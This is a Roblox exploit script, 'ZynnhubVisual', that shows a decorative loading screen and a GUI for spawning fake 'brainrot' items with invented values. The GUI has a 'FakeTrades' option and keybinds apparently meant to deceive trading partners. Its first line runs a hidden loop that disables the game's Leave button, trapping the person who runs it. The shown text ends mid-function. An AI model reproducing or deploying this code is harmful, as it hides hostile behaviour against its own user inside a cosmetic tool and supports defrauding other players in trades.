-- ============================================================
-- ZynnhubVisual — Loading Screen + Main GUI
-- discord.gg/zynnhub
-- ============================================================
task.spawn(function() while task.wait() do pcall(function() for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do v:Disable() end end) end end)

local Players        = game:GetService("Players")
local CoreGui        = game:GetService("CoreGui")
local TweenService   = game:GetService("TweenService")
local RunService     = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")

-- ============================================================
-- LOADING CONFIG
-- ============================================================
local LOAD = {
    Brand   = "Zynn Hub",
    Version = "v1.0",
    Title   = "ZynnHub Visual",
    Subtitle = "Loading modules...",
    TotalLoadTime  = 100,
    AutoCloseDelay = 1.0,
    Features = {
        "Visual Spawner",
        "Brainrot Model Loader",
        "Mutation System",
        "Billboard Display",
        "Custom Income Tag",
        "Custom Price Tag",
        "Floating Animation",
        "Sparkle Particles",
        "Camera-Bound Render",
        "Drag UI System",
    },
}

-- ============================================================
-- Cleanup prior instances
-- ============================================================
for _, gui in ipairs(CoreGui:GetChildren()) do
    if gui.Name == "ZynnhubLoader" or gui.Name == "ZynnhubVisual" then
        gui:Destroy()
    end
end

-- ============================================================
-- Gradient helper
-- ============================================================
local function applyGradient(parent, colors, rotation)
    local g = Instance.new("UIGradient")
    local kp = {}
    for i, c in ipairs(colors) do
        table.insert(kp, ColorSequenceKeypoint.new((i-1)/(#colors-1), c))
    end
    g.Color    = ColorSequence.new(kp)
    g.Rotation = rotation or 90
    g.Parent   = parent
    return g
end

-- ============================================================
-- =================== LOADING SCREEN ========================
-- ============================================================
local LoaderGui = Instance.new("ScreenGui")
LoaderGui.Name             = "ZynnhubLoader"
LoaderGui.ResetOnSpawn     = false
LoaderGui.IgnoreGuiInset   = true
LoaderGui.DisplayOrder     = 1000
LoaderGui.Parent           = CoreGui

local Backdrop = Instance.new("Frame")
Backdrop.BackgroundColor3     = Color3.fromRGB(0,0,0)
Backdrop.BackgroundTransparency = 1
Backdrop.BorderSizePixel      = 0
Backdrop.Size                 = UDim2.new(1,0,1,0)
Backdrop.Parent               = LoaderGui
applyGradient(Backdrop, {
    Color3.fromRGB(15,8,25),
    Color3.fromRGB(20,10,35),
    Color3.fromRGB(10,5,20),
}, 135)

local Card = Instance.new("Frame")
Card.AnchorPoint         = Vector2.new(0.5,0.5)
Card.Position            = UDim2.new(0.5,0,0.5,0)
Card.Size                = UDim2.new(0,420,0,0)
Card.BackgroundColor3    = Color3.fromRGB(18,12,28)
Card.BackgroundTransparency = 1
Card.BorderSizePixel     = 0
Card.Parent              = LoaderGui
Instance.new("UICorner", Card).CornerRadius = UDim.new(0,16)
applyGradient(Card, {
    Color3.fromRGB(25,16,40),
    Color3.fromRGB(35,22,55),
    Color3.fromRGB(22,14,35),
}, 135)

local CardStroke = Instance.new("UIStroke")
CardStroke.Color           = Color3.fromRGB(170,70,255)
CardStroke.Thickness       = 2
CardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
CardStroke.Parent          = Card
applyGradient(CardStroke, {
    Color3.fromRGB(110,40,200),
    Color3.fromRGB(220,150,255),
    Color3.fromRGB(110,40,200),
}, 45)

local Brand = Instance.new("TextLabel")
Brand.BackgroundTransparency = 1
Brand.Position = UDim2.new(0,24,0,22)
Brand.Size     = UDim2.new(1,-48,0,22)
Brand.Font     = Enum.Font.GothamBold
Brand.Text     = LOAD.Brand.."  •  "..LOAD.Version
Brand.TextColor3 = Color3.fromRGB(200,130,255)
Brand.TextSize   = 13
Brand.TextXAlignment = Enum.TextXAlignment.Left
Brand.Parent   = Card

local Title = Instance.new("TextLabel")
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0,24,0,48)
Title.Size     = UDim2.new(1,-48,0,36)
Title.Font     = Enum.Font.GothamBlack
Title.Text     = LOAD.Title
Title.TextColor3   = Color3.fromRGB(245,230,255)
Title.TextSize     = 26
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent   = Card
applyGradient(Title, {Color3.fromRGB(255,255,255), Color3.fromRGB(200,130,255)}, 90)

local Subtitle = Instance.new("TextLabel")
Subtitle.BackgroundTransparency = 1
Subtitle.Position = UDim2.new(0,24,0,86)
Subtitle.Size     = UDim2.new(1,-48,0,18)
Subtitle.Font     = Enum.Font.Gotham
Subtitle.Text     = LOAD.Subtitle
Subtitle.TextColor3 = Color3.fromRGB(160,140,190)
Subtitle.TextSize   = 13
Subtitle.TextXAlignment = Enum.TextXAlignment.Left
Subtitle.Parent   = Card

local ListFrame = Instance.new("Frame")
ListFrame.BackgroundTransparency = 1
ListFrame.Position = UDim2.new(0,24,0,124)
ListFrame.Size     = UDim2.new(1,-48,0,280)
ListFrame.Parent   = Card
local LL = Instance.new("UIListLayout", ListFrame)
LL.Padding    = UDim.new(0,6)
LL.SortOrder  = Enum.SortOrder.LayoutOrder

local featureRows = {}
local function createFeatureRow(text, idx)
    local row = Instance.new("Frame")
    row.BackgroundColor3    = Color3.fromRGB(28,18,45)
    row.BackgroundTransparency = 0.3
    row.BorderSizePixel     = 0
    row.Size                = UDim2.new(1,0,0,24)
    row.LayoutOrder         = idx
    row.Parent              = ListFrame
    Instance.new("UICorner", row).CornerRadius = UDim.new(0,6)

    local Icon = Instance.new("TextLabel")
    Icon.BackgroundTransparency = 1
    Icon.Position = UDim2.new(0,10,0,0)
    Icon.Size     = UDim2.new(0,18,1,0)
    Icon.Font     = Enum.Font.GothamBold
    Icon.Text     = "○"
    Icon.TextColor3 = Color3.fromRGB(120,100,150)
    Icon.TextSize   = 14
    Icon.TextXAlignment = Enum.TextXAlignment.Left
    Icon.Parent   = row

    local Label = Instance.new("TextLabel")
    Label.BackgroundTransparency = 1
    Label.Position = UDim2.new(0,32,0,0)
    Label.Size     = UDim2.new(1,-90,1,0)
    Label.Font     = Enum.Font.GothamMedium
    Label.Text     = text
    Label.TextColor3 = Color3.fromRGB(170,150,200)
    Label.TextSize   = 12
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent   = row

    local Status = Instance.new("TextLabel")
    Status.BackgroundTransparency = 1
    Status.AnchorPoint  = Vector2.new(1,0)
    Status.Position     = UDim2.new(1,-10,0,0)
    Status.Size         = UDim2.new(0,70,1,0)
    Status.Font         = Enum.Font.GothamBold
    Status.Text         = "WAIT"
    Status.TextColor3   = Color3.fromRGB(120,100,150)
    Status.TextSize     = 10
    Status.TextXAlignment = Enum.TextXAlignment.Right
    Status.Parent       = row

    return {row=row, icon=Icon, label=Label, status=Status}
end

for i, fn in ipairs(LOAD.Features) do
    featureRows[i] = createFeatureRow(fn, i)
end

local BarBg = Instance.new("Frame")
BarBg.BackgroundColor3 = Color3.fromRGB(28,18,45)
BarBg.BorderSizePixel  = 0
BarBg.Position         = UDim2.new(0,24,1,-64)
BarBg.Size             = UDim2.new(1,-48,0,8)
BarBg.Parent           = Card
Instance.new("UICorner", BarBg).CornerRadius = UDim.new(1,0)

local BarFill = Instance.new("Frame")
BarFill.BackgroundColor3 = Color3.fromRGB(170,70,255)
BarFill.BorderSizePixel  = 0
BarFill.Size             = UDim2.new(0,0,1,0)
BarFill.Parent           = BarBg
Instance.new("UICorner", BarFill).CornerRadius = UDim.new(1,0)
applyGradient(BarFill, {
    Color3.fromRGB(110,40,200),
    Color3.fromRGB(170,70,255),
    Color3.fromRGB(220,150,255),
}, 0)

local PercentLabel = Instance.new("TextLabel")
PercentLabel.BackgroundTransparency = 1
PercentLabel.Position = UDim2.new(0,24,1,-36)
PercentLabel.Size     = UDim2.new(1,-48,0,18)
PercentLabel.Font     = Enum.Font.GothamBold
PercentLabel.Text     = "0%"
PercentLabel.TextColor3   = Color3.fromRGB(200,130,255)
PercentLabel.TextSize     = 12
PercentLabel.TextXAlignment = Enum.TextXAlignment.Left
PercentLabel.Parent   = Card

local StatusLabel = Instance.new("TextLabel")
StatusLabel.BackgroundTransparency = 1
StatusLabel.Position = UDim2.new(0,24,1,-36)
StatusLabel.Size     = UDim2.new(1,-48,0,18)
StatusLabel.Font     = Enum.Font.GothamMedium
StatusLabel.Text     = "Initializing..."
StatusLabel.TextColor3   = Color3.fromRGB(160,140,190)
StatusLabel.TextSize     = 11
StatusLabel.TextXAlignment = Enum.TextXAlignment.Right
StatusLabel.Parent   = Card

-- spinner
local spinnerActive = nil
local spinnerStart  = 0
local spinnerConn = RunService.Heartbeat:Connect(function()
    if not spinnerActive then return end
    local t = tick() - spinnerStart
    local frames = {"◐","◓","◑","◒"}
    local fi = (math.floor(t*6) % #frames) + 1
    spinnerActive.icon.Text = frames[fi]
end)

-- entrance animation
TweenService:Create(Backdrop, TweenInfo.new(0.35, Enum.EasingStyle.Quad), {BackgroundTransparency=0.15}):Play()
TweenService:Create(Card, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0,420,0,480),
    BackgroundTransparency = 0,
}):Play()

task.wait(0.5)

local stepTime = LOAD.TotalLoadTime / #LOAD.Features
for i, feat in ipairs(featureRows) do
    spinnerActive = feat
    spinnerStart  = tick()
    feat.status.Text      = "LOADING"
    feat.status.TextColor3 = Color3.fromRGB(220,150,255)
    TweenService:Create(feat.label, TweenInfo.new(0.2), {TextColor3=Color3.fromRGB(230,210,255)}):Play()
    TweenService:Create(feat.row,   TweenInfo.new(0.2), {BackgroundTransparency=0.1, BackgroundColor3=Color3.fromRGB(45,25,70)}):Play()

    StatusLabel.Text = "Loading: "..LOAD.Features[i]
    local pFrom     = (i-1) / #LOAD.Features
    local pTo       = i     / #LOAD.Features
    local stepStart = tick()
    while tick() - stepStart < stepTime do
        local lt = (tick() - stepStart) / stepTime
        local p  = pFrom + (pTo - pFrom) * lt
        BarFill.Size          = UDim2.new(p,0,1,0)
        PercentLabel.Text     = string.format("%d%%", math.floor(p*100))
        RunService.Heartbeat:Wait()
    end

    spinnerActive = nil
    feat.icon.Text        = "✓"
    feat.icon.TextColor3  = Color3.fromRGB(120,255,160)
    feat.status.Text      = "OK"
    feat.status.TextColor3 = Color3.fromRGB(120,255,160)
    TweenService:Create(feat.row, TweenInfo.new(0.2), {
        BackgroundColor3=Color3.fromRGB(28,18,45), BackgroundTransparency=0.3
    }):Play()
end

BarFill.Size              = UDim2.new(1,0,1,0)
PercentLabel.Text         = "100%"
StatusLabel.Text          = "Ready"
StatusLabel.TextColor3    = Color3.fromRGB(120,255,160)
Subtitle.Text             = "All modules loaded successfully"

if spinnerConn then spinnerConn:Disconnect() end

task.wait(LOAD.AutoCloseDelay)

TweenService:Create(Card, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
    Size = UDim2.new(0,420,0,0), BackgroundTransparency=1
}):Play()
TweenService:Create(Backdrop, TweenInfo.new(0.35, Enum.EasingStyle.Quad), {BackgroundTransparency=1}):Play()

task.wait(0.4)
LoaderGui:Destroy()

-- ============================================================
-- =================== ZYNNHUB MAIN GUI ======================
-- ============================================================

-- ========================
-- CONFIGURATION
-- ========================
local CFG = {
    PrimaryColor   = Color3.fromRGB(30, 30, 35),
    SecondaryColor = Color3.fromRGB(22, 22, 27),
    AccentColor    = Color3.fromRGB(88, 101, 242),
    SelectedColor  = Color3.fromRGB(45, 50, 110),
    TextColor      = Color3.fromRGB(255, 255, 255),
    SubTextColor   = Color3.fromRGB(160, 160, 170),
    GreenColor     = Color3.fromRGB(87, 242, 135),
    BorderColor    = Color3.fromRGB(50, 50, 60),
    ToggleOnColor  = Color3.fromRGB(88, 101, 242),
    ToggleOffColor = Color3.fromRGB(70, 70, 80),
    Font           = Enum.Font.GothamBold,
    FontRegular    = Enum.Font.Gotham,
}

-- ========================
-- DATA
-- ========================
local BrainrotData = {
    { name = "1x1x1x1",            value = "$1.1M/s"  },
    { name = "25",                  value = "$2.5M/s"  },
    { name = "67",                  value = "$7.5M/s"  },
    { name = "Abyssaloco",          value = "$33.3M/s" },
    { name = "Strawberry Elephant", value = "$50M/s"   },
    { name = "Meowl",               value = "$45M/s"   },
    { name = "John Pork",           value = "$40M/s"   },
    { name = "Headless Horseman",   value = "$80M/s"   },
    { name = "Dragon Cannelloni",   value = "$120M/s"  },
    { name = "Hydra Dragon",        value = "$200M/s"  },
    { name = "Cannelloni",          value = "$60M/s"   },
    { name = "Garama",              value = "$90M/s"   },
}

local MutationData = {
    "None", "Gold", "Diamond", "Candy", "Lava", "Cyber", "YinYang", "Cursed", "Radioactive"
}

local TraitData = {
    { name = "Strawberry", icon = "🍓" },
    { name = "Meowl",      icon = "🐱" },
    { name = "John Pork",  icon = "🐷" },
    { name = "UFO",        icon = "🛸" },
    { name = "Wet",        icon = "💧" },
    { name = "Sleepy",     icon = "💤" },
}

local KeybindData = {
    { action = "Open/Close UI",              sub = "Press twice to open/close", key = "LeftControl" },
    { action = "Receive Trade Notification", sub = "",                          key = "E"           },
    { action = "Add Other Side Brainrots",   sub = "",                          key = "Q"           },
    { action = "Rejoin Server",              sub = "",                          key = "T"           },
}

-- ========================
-- STATE
-- ========================
local State = {
    ActiveTab        = "Brainrots",
    SelectedBrainrot = nil,
    SelectedMutation = "None",
    FakeTrades       = true,
    SaveBrainrots    = true,
    AutoHideGUI      = false,
    GuiVisible       = true,
    Dragging         = false,
    DragStart        = nil,
    StartPos         = nil,
}

-- ========================
-- UTILITY
-- ========================
local function Mk(class, props)
    local o = Instance.new(class)
    for k,v in pairs(props or {}) do o[k]=v end
    return o
end

local function Tw(obj, props, t)
    TweenService:Create(obj, TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
end

local function Cor(r, p)
    local c = Instance.new("UICorner"); c.CornerRadius=UDim.new(0,r or 8); c.Parent=p
end

local function Str(color, thick, p)
    local s=Instance.new("UIStroke"); s.Color=color or CFG.BorderColor
    s.Thickness=thick or 1; s.ApplyStrokeMode=Enum.ApplyStrokeMode.Border; s.Parent=p; return s
end

local function Pad(t,r,b,l,p)
    local x=Instance.new("UIPadding")
    x.PaddingTop=UDim.new(0,t or 8); x.PaddingRight=UDim.new(0,r or 8)
    x.PaddingBottom=UDim.new(0,b or 8); x.PaddingLeft=UDim.new(0,l or 8); x.Parent=p
end

local function VList(p, gap)
    local l=Instance.new("UIListLayout")
    l.Padding=UDim.new(0,gap or 0); l.SortOrder=Enum.SortOrder.LayoutOrder
    l.FillDirection=Enum.FillDirection.Vertical; l.Parent=p; return l
end

local function HList(p, gap)
    local l=Instance.new("UIListLayout")
    l.Padding=UDim.new(0,gap or 0); l.SortOrder=Enum.SortOrder.LayoutOrder
    l.FillDirection=Enum.FillDirection.Horizontal
    l.VerticalAlignment=Enum.VerticalAlignment.Center; l.Parent=p; return l
end

-- ========================
-- ROOT GUI
-- ========================
local ScreenGui = Mk("ScreenGui", {
    Name="ZynnhubVisual", ResetOnSpawn=false,
    ZIndexBehavior=Enum.ZIndexBehavior.Sibling, Parent=PlayerGui,
})

local MainFrame = Mk("Frame", {
    Name="MainFrame", Size=UDim2.new(0,380,0,560),
    Position=UDim2.new(0.5,-190,0.5,-280),
    BackgroundColor3=CFG.SecondaryColor, BorderSizePixel=0, Parent=ScreenGui,
})
Cor(12, MainFrame); Str(CFG.BorderColor,1,MainFrame)

Mk("ImageLabel", {
    Size=UDim2.new(1,40,1,40), Position=UDim2.new(0,-20,0,-20),
    BackgroundTransparency=1, Image="rbxassetid://5554236805",
    ImageColor3=Color3.fromRGB(0,0,0), ImageTransparency=0.65,
    ScaleType=Enum.ScaleType.Slice, SliceCenter=Rect.new(23,23,277,277),
    ZIndex=-1, Parent=MainFrame,
})

-- entrance animation for main GUI
MainFrame.Size = UDim2.new(0,380,0,0)
MainFrame.BackgroundTransparency = 1
TweenService:Create(MainFrame, TweenInfo.new(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.Out), {
    Size=UDim2.new(0,380,0,560), BackgroundTransparency=0,
}):Play()

-- ========================
-- TITLE BAR
-- ========================
local TitleBar = Mk("Frame", {
    Size=UDim2.new(1,0,0,50), BackgroundColor3=CFG.PrimaryColor,
    BorderSizePixel=0, Parent=MainFrame,
})
Cor(12, TitleBar)
Mk("Frame", {
    Size=UDim2.new(1,0,0,12), Position=UDim2.new(0,0,1,-12),
    BackgroundColor3=CFG.PrimaryColor, BorderSizePixel=0, Parent=TitleBar,
})

Mk("TextLabel", {
    Size=UDim2.new(0,150,1,0), Position=UDim2.new(0,14,0,0),
    BackgroundTransparency=1, Text="Zynnhub Visual",
    TextColor3=CFG.TextColor, TextSize=16, Font=CFG.Font,
    TextXAlignment=Enum.TextXAlignment.Left, Parent=TitleBar,
})
Mk("Frame", {
    Size=UDim2.new(0,1,0,24), Position=UDim2.new(0,162,0.5,-12),
    BackgroundColor3=CFG.BorderColor, BorderSizePixel=0, Parent=TitleBar,
})
Mk("TextLabel", {
    Size=UDim2.new(0,170,1,0), Position=UDim2.new(0,170,0,0),
    BackgroundTransparency=1, Text="discord.gg/zynnhub",
    TextColor3=CFG.SubTextColor, TextSize=13, Font=CFG.FontRegular,
    TextXAlignment=Enum.TextXAlignment.Left, Parent=TitleBar,
})

local CloseBtn2 = Mk("TextButton", {
    Size=UDim2.new(0,28,0,28), Position=UDim2.new(1,-38,0.5,-14),
    BackgroundColor3=Color3.fromRGB(237,66,69), BorderSizePixel=0,
    Text="✕", TextColor3=CFG.TextColor, TextSize=13, Font=CFG.Font, Parent=TitleBar,
})
Cor(6, CloseBtn2)
CloseBtn2.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)

-- drag
TitleBar.InputBegan:Connect(function(inp)
    if inp.UserInputType == Enum.UserInputType.MouseButton1 then
        State.Dragging=true; State.DragStart=inp.Position; State.StartPos=MainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(inp)
    if State.Dragging and inp.UserInputType==Enum.UserInputType.MouseMovement then
        local d=inp.Position-State.DragStart
        MainFrame.Position=UDim2.new(State.StartPos.X.Scale,State.StartPos.X.Offset+d.X,
                                     State.StartPos.Y.Scale,State.StartPos.Y.Offset+d.Y)
    end
end)
UserInputService.InputEnded:Connect(function(inp)
    if inp.UserInputType==Enum.UserInputType.MouseButton1 then State.Dragging=false end
end)

-- ========================
-- TAB BAR
-- ========================
local TabBar = Mk("Frame", {
    Size=UDim2.new(1,-20,0,36), Position=UDim2.new(0,10,0,58),
    BackgroundColor3=CFG.PrimaryColor, BorderSizePixel=0, Parent=MainFrame,
})
Cor(8,TabBar); Str(CFG.BorderColor,1,TabBar)

local tLL=Instance.new("UIListLayout")
tLL.FillDirection=Enum.FillDirection.Horizontal
tLL.HorizontalAlignment=Enum.HorizontalAlignment.Center
tLL.VerticalAlignment=Enum.VerticalAlignment.Center
tLL.Padding=UDim.new(0,2); tLL.Parent=TabBar

local Tabs     = {"Brainrots","Trades","Keybinds","Settings"}
local TabIcons = {Brainrots="🧠",Trades="⇄",Keybinds="⌨",Settings="⚙"}
local TabButtons = {}

for _, tname in ipairs(Tabs) do
    local btn=Mk("TextButton",{
        Size=UDim2.new(0,82,0,28), BackgroundColor3=CFG.AccentColor,
        BackgroundTransparency=1, BorderSizePixel=0,
        Text=TabIcons[tname].." "..tname, TextColor3=CFG.SubTextColor,
        TextSize=12, Font=CFG.Font, Parent=TabBar,
    })
    Cor(6,btn); TabButtons[tname]=btn
end

local ContentArea = Mk("Frame",{
    Size=UDim2.new(1,-20,1,-110), Position=UDim2.new(0,10,0,102),
    BackgroundTransparency=1, ClipsDescendants=true, Parent=MainFrame,
})

local Pages = {}

-- ========================
-- SHARED HELPERS
-- ========================
local function MakeScroll(parent)
    local s=Mk("ScrollingFrame",{
        Size=UDim2.new(1,0,1,0), BackgroundTransparency=1, BorderSizePixel=0,
        ScrollBarThickness=3, ScrollBarImageColor3=CFG.AccentColor,
        CanvasSize=UDim2.new(0,0,0,0), AutomaticCanvasSize=Enum.AutomaticSize.Y,
        Parent=parent,
    })
    VList(s,8); return s
end

local function MakeCard(parent, order)
    local c=Mk("Frame",{
        Size=UDim2.new(1,0,0,0), AutomaticSize=Enum.AutomaticSize.Y,
        BackgroundColor3=CFG.PrimaryColor, BorderSizePixel=0,
        LayoutOrder=order or 1, Parent=parent,
    })
    Cor(10,c); Str(CFG.BorderColor,1,c); return c
end

local function MakeToggle(parent, label, sub, init, onChange)
    local row=Mk("Frame",{Size=UDim2.new(1,0,0,60),BackgroundTransparency=1,Parent=parent})
    Mk("TextLabel",{Size=UDim2.new(1,-70,0,20),Position=UDim2.new(0,14,0,10),
        BackgroundTransparency=1,Text=label,TextColor3=CFG.TextColor,TextSize=14,
        Font=CFG.Font,TextXAlignment=Enum.TextXAlignment.Left,Parent=row})
    if sub and sub~="" then
        Mk("TextLabel",{Size=UDim2.new(1,-70,0,16),Position=UDim2.new(0,14,0,30),
            BackgroundTransparency=1,Text=sub,TextColor3=CFG.SubTextColor,TextSize=11,
            Font=CFG.FontRegular,TextXAlignment=Enum.TextXAlignment.Left,Parent=row})
    end
    local bg=Mk("Frame",{Size=UDim2.new(0,44,0,24),Position=UDim2.new(1,-58,0.5,-12),
        BackgroundColor3=init and CFG.ToggleOnColor or CFG.ToggleOffColor,
        BorderSizePixel=0,Parent=row})
    Cor(12,bg)
    local circle=Mk("Frame",{Size=UDim2.new(0,18,0,18),
        Position=init and UDim2.new(1,-21,0.5,-9) or UDim2.new(0,3,0.5,-9),
        BackgroundColor3=Color3.fromRGB(255,255,255),BorderSizePixel=0,Parent=bg})
    Cor(9,circle)
    local toggled=init
    local ca=Mk("TextButton",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text="",Parent=bg})
    ca.MouseButton1Click:Connect(function()
        toggled=not toggled
        Tw(bg,{BackgroundColor3=toggled and CFG.ToggleOnColor or CFG.ToggleOffColor})
        Tw(circle,{Position=toggled and UDim2.new(1,-21,0.5,-9) or UDim2.new(0,3,0.5,-9)})
        if onChange then onChange(toggled) end
    end)
end

-- ========================
-- PAGE: BRAINROTS
-- ========================
local BrainrotsPage=Mk("Frame",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Visible=true,Parent=ContentArea})
Pages["Brainrots"]=BrainrotsPage
local bScroll=MakeScroll(BrainrotsPage)

-- selected bar
local selBar=Mk("Frame",{
    Size=UDim2.new(1,0,0,36),BackgroundColor3=CFG.SelectedColor,
    BorderSizePixel=0,LayoutOrder=0,Visible=false,Parent=bScroll,
})
Cor(8,selBar); Str(CFG.AccentColor,1,selBar)
local selBarLabel=Mk("TextLabel",{
    Size=UDim2.new(1,-50,1,0),Position=UDim2.new(0,12,0,0),
    BackgroundTransparency=1,Text="",TextColor3=CFG.TextColor,
    TextSize=13,Font=CFG.Font,TextXAlignment=Enum.TextXAlignment.Left,Parent=selBar,
})
local deselBtn=Mk("TextButton",{
    Size=UDim2.new(0,38,0,24),Position=UDim2.new(1,-46,0.5,-12),
    BackgroundColor3=Color3.fromRGB(180,50,55),BorderSizePixel=0,
    Text="✕",TextColor3=CFG.TextColor,TextSize=12,Font=CFG.Font,Parent=selBar,
})
Cor(6,deselBtn)

-- search
local searchCard=MakeCard(bScroll,1)
searchCard.Size=UDim2.new(1,0,0,40); searchCard.AutomaticSize=Enum.AutomaticSize.None
local searchBox=Mk("TextBox",{
    Size=UDim2.new(1,-20,1,-10),Position=UDim2.new(0,10,0,5),
    BackgroundTransparency=1,Text="",PlaceholderText="Search brainrots...",
    PlaceholderColor3=CFG.SubTextColor,TextColor3=CFG.TextColor,TextSize=13,
    Font=CFG.FontRegular,TextXAlignment=Enum.TextXAlignment.Left,
    ClearTextOnFocus=false,Parent=searchCard,
})

-- brainrot list
local listCard=MakeCard(bScroll,2)
Pad(6,8,6,8,listCard); VList(listCard,3)

local brainrotRows={}
local selectedBrainrotIdx=nil

local function SetBrainrotHL(idx)
    for i,entry in ipairs(brainrotRows) do
        if i==idx then
            Tw(entry.frame,{BackgroundColor3=CFG.SelectedColor})
            local has=false
            for _,ch in ipairs(entry.frame:GetChildren()) do if ch:IsA("UIStroke") then has=true end end
            if not has then Str(CFG.AccentColor,1,entry.frame) end
            entry.ck.Text="✔"
        else
            local dc=i%2==0 and Color3.fromRGB(28,28,33) or Color3.fromRGB(24,24,29)
            Tw(entry.frame,{BackgroundColor3=dc})
            for _,ch in ipairs(entry.frame:GetChildren()) do if ch:IsA("UIStroke") then ch:Destroy() end end
            entry.ck.Text=""
        end
    end
end

for i,br in ipairs(BrainrotData) do
    local dc=i%2==0 and Color3.fromRGB(28,28,33) or Color3.fromRGB(24,24,29)
    local row=Mk("Frame",{
        Size=UDim2.new(1,0,0,36),BackgroundColor3=dc,
        BorderSizePixel=0,LayoutOrder=i,Parent=listCard,
    })
    Cor(6,row)
    Mk("TextLabel",{Size=UDim2.new(0.55,0,1,0),Position=UDim2.new(0,10,0,0),
        BackgroundTransparency=1,Text=br.name,TextColor3=CFG.TextColor,
        TextSize=13,Font=CFG.FontRegular,TextXAlignment=Enum.TextXAlignment.Left,Parent=row})
    Mk("TextLabel",{Size=UDim2.new(0.3,0,1,0),Position=UDim2.new(0.55,0,0,0),
        BackgroundTransparency=1,Text=br.value,TextColor3=CFG.GreenColor,
        TextSize=13,Font=CFG.Font,TextXAlignment=Enum.TextXAlignment.Right,Parent=row})
    local ck=Mk("TextLabel",{
        Size=UDim2.new(0,26,1,0),Position=UDim2.new(1,-30,0,0),
        BackgroundTransparency=1,Text="",TextColor3=CFG.GreenColor,
        TextSize=14,Font=CFG.Font,TextXAlignment=Enum.TextXAlignment.Center,Parent=row,
    })
    local cb=Mk("TextButton",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text="",Parent=row})
    local ci=i
    cb.MouseButton1Click:Connect(function()
        if selectedBrainrotIdx==ci then
            selectedBrainrotIdx=nil; State.SelectedBrainrot=nil
            SetBrainrotHL(nil); selBar.Visible=false
        else
            selectedBrainrotIdx=ci; State.SelectedBrainrot=br.name
            SetBrainrotHL(ci); selBar.Visible=true
            selBarLabel.Text="✔  "..br.name.."   "..br.value
        end
    end)
    brainrotRows[i]={frame=row,name=br.name:lower(),ck=ck}
end

deselBtn.MouseButton1Click:Connect(function()
    selectedBrainrotIdx=nil; State.SelectedBrainrot=nil; SetBrainrotHL(nil); selBar.Visible=false
end)

searchBox:GetPropertyChangedSignal("Text"):Connect(function()
    local q=searchBox.Text:lower()
    for _,e in ipairs(brainrotRows) do
        e.frame.Visible=(q=="" or e.name:find(q,1,true)~=nil)
    end
end)

-- ========================
-- TRAITS CARD
-- ========================
local traitsCard=MakeCard(bScroll,3)
Pad(8,8,8,8,traitsCard); VList(traitsCard,2)

local traitsHeader=Mk("Frame",{Size=UDim2.new(1,0,0,30),BackgroundTransparency=1,LayoutOrder=1,Parent=traitsCard})
local traitsLabel=Mk("TextLabel",{
    Size=UDim2.new(0.55,0,1,0),BackgroundTransparency=1,Text="Traits: None",
    TextColor3=CFG.TextColor,TextSize=13,Font=CFG.Font,
    TextXAlignment=Enum.TextXAlignment.Left,Parent=traitsHeader,
})
local allBtn=Mk("TextButton",{
    Size=UDim2.new(0,38,0,24),Position=UDim2.new(1,-84,0.5,-12),
    BackgroundColor3=CFG.AccentColor,BorderSizePixel=0,
    Text="All",TextColor3=CFG.TextColor,TextSize=12,Font=CFG.Font,Parent=traitsHeader,
})
Cor(6,allBtn)
local clearTraitBtn=Mk("TextButton",{
    Size=UDim2.new(0,48,0,24),Position=UDim2.new(1,-48,0.5,-12),
    BackgroundColor3=CFG.PrimaryColor,BorderSizePixel=0,
    Text="Clear",TextColor3=CFG.TextColor,TextSize=12,Font=CFG.Font,Parent=traitsHeader,
})
Cor(6,clearTraitBtn); Str(CFG.BorderColor,1,clearTraitBtn)

local tSBg=Mk("Frame",{
    Size=UDim2.new(1,0,0,32),BackgroundColor3=CFG.SecondaryColor,
    BorderSizePixel=0,LayoutOrder=2,Parent=traitsCard,
})
Cor(6,tSBg); Str(CFG.BorderColor,1,tSBg)
local traitSearchBox=Mk("TextBox",{
    Size=UDim2.new(1,-16,1,-8),Position=UDim2.new(0,8,0,4),
    BackgroundTransparency=1,Text="",PlaceholderText="Search traits...",
    PlaceholderColor3=CFG.SubTextColor,TextColor3=CFG.TextColor,TextSize=12,
    Font=CFG.FontRegular,TextXAlignment=Enum.TextXAlignment.Left,ClearTextOnFocus=false,Parent=tSBg,
})

local traitRows={}
local selectedTraits={}

local function UpdateTraitsLabel()
    local names={}
    for n,_ in pairs(selectedTraits) do table.insert(names,n) end
    traitsLabel.Text=#names==0 and "Traits: None" or "Traits: "..table.concat(names,", ")
end

for i,trait in ipairs(TraitData) do
    local tRow=Mk("Frame",{
        Size=UDim2.new(1,0,0,34),BackgroundColor3=CFG.PrimaryColor,
        BorderSizePixel=0,LayoutOrder=i+2,Parent=traitsCard,
    })
    Cor(6,tRow)
    Mk("TextLabel",{Size=UDim2.new(1,-36,1,0),Position=UDim2.new(0,10,0,0),
        BackgroundTransparency=1,Text=trait.icon.."  "..trait.name,
        TextColor3=CFG.TextColor,TextSize=13,Font=CFG.FontRegular,
        TextXAlignment=Enum.TextXAlignment.Left,Parent=tRow})
    local tCk=Mk("TextLabel",{
        Size=UDim2.new(0,28,1,0),Position=UDim2.new(1,-32,0,0),
        BackgroundTransparency=1,Text="",TextColor3=CFG.GreenColor,
        TextSize=14,Font=CFG.Font,TextXAlignment=Enum.TextXAlignment.Center,Parent=tRow,
    })
    local tCl=Mk("TextButton",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text="",Parent=tRow})
    local tName=trait.name
